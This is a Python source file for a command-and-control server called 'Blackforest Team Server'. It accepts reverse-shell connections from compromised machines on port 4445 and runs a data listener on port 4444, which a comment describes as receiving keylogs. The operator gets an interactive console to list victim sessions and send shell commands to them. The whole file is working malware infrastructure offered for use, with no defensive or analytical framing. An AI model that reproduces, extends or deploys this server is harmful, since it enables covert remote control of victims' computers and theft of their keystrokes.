import socket
import threading
import time
import sys
import os

# Import Data Listener Logic
# We need to make sure listener.py doesn't auto-run on import. 
# (It has if __name__ == "__main__", so we represent safe import)
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
import listener 

# C2 Configuration
HOST = '0.0.0.0'
SHELL_PORT = 4445
DATA_PORT = 4444

sessions = [] # List of (client, addr)
streaming_mode = False # If true, print Keylogs to console

def accept_connections():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, SHELL_PORT))
    except OSError:
        print(f"[!] Shell Port {SHELL_PORT} busy. Kill old process.")
        return

    server.listen(5)
    
    while True:
        try:
            client, addr = server.accept()
            sessions.append({"client": client, "addr": addr})
            print(f"\n[+] New Shell Session ({len(sessions)-1}) from {addr[0]}")
            print("C2> ", end="", flush=True) 
        except:
            break

def start_data_listener():
    # Redirect listener's print/log logic if needed, 
    # but for now we just run it.
    # We monkey-patch listener's handle_client to respect our streaming_mode?
    # Or determining simply: listener logs to file. We tail file?
    # NO, simpler: separate thread runs listener. Its prints go to stdout.
    # We rely on previous silence edit.
    try:
        listener.start_server()
    except Exception as e:
        print(f"[!] Data Listener Failed: {e}")

def interact(session_id):
    if session_id < 0 or session_id >= len(sessions):
        print("[-] Invalid Session ID")
        return
        
    target = sessions[session_id]
    client = target["client"]
    addr = target["addr"]
    
    print(f"[*] Entering Shell {session_id} ({addr[0]}). Type 'back' to return.")
    
    stop_event = threading.Event()
    
    def recv_loop():
        while not stop_event.is_set():
            try:
                data = client.recv(4096)
                if not data: 
                    print("\n[-] Connection Lost.")
                    stop_event.set()
                    break
                print(data.decode('utf-8', errors='ignore'), end='', flush=True)
            except:
                break
                
    t = threading.Thread(target=recv_loop, daemon=True)
    t.start()
    
    while not stop_event.is_set():
        try:
            cmd = input("")
            if cmd.strip() == "back":
                stop_event.set()
                print("[*] Backgrounding session...")
                break
                
            client.send((cmd + "\n").encode('utf-8'))
        except:
            break

def main():
    print(f"[*] Blackforest Team Server Started")
    print(f"[*] Shell Listener: {SHELL_PORT}")
    print(f"[*] Data Listener:  {DATA_PORT}")
    print("[*] Type 'help' for commands.")
    
    # 1. Start Shell Listener (Background)
    t_shell = threading.Thread(target=accept_connections, daemon=True)
    t_shell.start()

    # 2. Start Data Listener (Background)
    t_data = threading.Thread(target=start_data_listener, daemon=True)
    t_data.start()
    
    # 3. Main Loop
    while True:
        try:
            cmd = input("C2> ").strip().split()
            if not cmd: continue
            
            if cmd[0] == "list":
                print("\n--- Active Shell Sessions ---")
                for i, s in enumerate(sessions):
                    try:
                        # Check alive
                        s["client"].setblocking(False)
                        try:
                            d = s["client"].recv(1, socket.MSG_PEEK)
                            if d == b'': raise Exception
                        except BlockingIOError: pass
                        s["client"].setblocking(True)
                        print(f"[{i}] {s['addr'][0]}:{s['addr'][1]}")
                    except:
                        print(f"[{i}] {s['addr'][0]} (DEAD)")
                print("-----------------------------")
                
            elif cmd[0] == "interact":
                if len(cmd) < 2:
                    print("Usage: interact <id>")
                else:
                    interact(int(cmd[1]))
            
            elif cmd[0] == "help":
                print("Commands:")
                print("  list           - Show active shells")
                print("  interact <id>  - Enter shell")
                print("  exit           - Kill server")
                
            elif cmd[0] == "exit":
                print("[*] Shutting down...")
                # We should really close sockets here
                os._exit(0) 
                
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
